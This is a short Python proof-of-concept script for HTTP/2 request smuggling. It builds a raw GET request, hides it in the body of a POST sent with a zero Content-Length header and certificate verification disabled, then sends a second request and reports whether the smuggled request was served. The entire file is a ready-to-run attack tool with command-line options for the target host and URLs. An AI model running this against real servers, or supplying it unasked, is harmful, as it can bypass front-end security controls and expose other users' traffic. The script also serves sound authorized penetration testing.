import httpx
import argparse
import code

def smuggled_req(target_url):
    return """GET """+target_url+""" HTTP/1.1
Host: localhost

""".replace("\r\n","RN").replace("\n","RN").replace("\r","RN").replace("RN","\r\n") #Making sure editor didn't change newline

def hrs_found(req):
    return req.status_code != 404
    #return "hrs" in str(req.content)


client = httpx.Client(http2=True,verify=False,limits=httpx.Limits(max_keepalive_connections=1, max_connections=1))


def pretty_print_req(req,title):
    print(title+":")
    print("{{{{")
    print(req.method + ' ' + str(req.url) + ' HTTP/2')
    print('\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()))
    print()
    print(req.content)
    print("}}}}")
    

if __name__ == '__main__':
    #CLI argument parsing
    parser = argparse.ArgumentParser(description='HTTP2 Request Smuggling POC')
    parser.add_argument('--host', type=str, help='target host')
    parser.add_argument('--url1', type=str, help='primary request\'s URL')
    parser.add_argument('--url1s', type=str, help='smuggled URL in the body of the primary request')
    parser.add_argument('--url2', type=str, help='secondary request\'s URL')
    parser.add_argument('--debug', help='display requests sent', action='store_true')
    
    args = parser.parse_args()
    #code.interact(banner="Start", local=locals(), exitmsg="End")

    
    
    #HTTPS/HTTP2 connection
    client = httpx.Client(http2=True,verify=False,limits=httpx.Limits(max_keepalive_connections=1, max_connections=1))
    

    #Request 1
    r1 = client.post(args.host+args.url1, data=smuggled_req(args.url1s), headers={'Content-Length': '0'})
    print(" [+] Request 1 {} => {}".format(args.url1,r1.status_code))
    #Request 2 (=> 404 if it didn't work)
    r2 = client.get(args.host+args.url2)
    print(" [+] Request 2 {} => {}".format(args.url2,r2.status_code))
    
    found = hrs_found(r2)

    print(" [+] HRS successful: {}".format(found)) #If the response for the smuggled request was received.
    
    if(args.debug):
        pretty_print_req(r1.request, "Request 1")
        pretty_print_req(r2.request, "Request 2")

    #print("Response from request 2")
    print(" [+] Response from second request:")
    print(r2.content)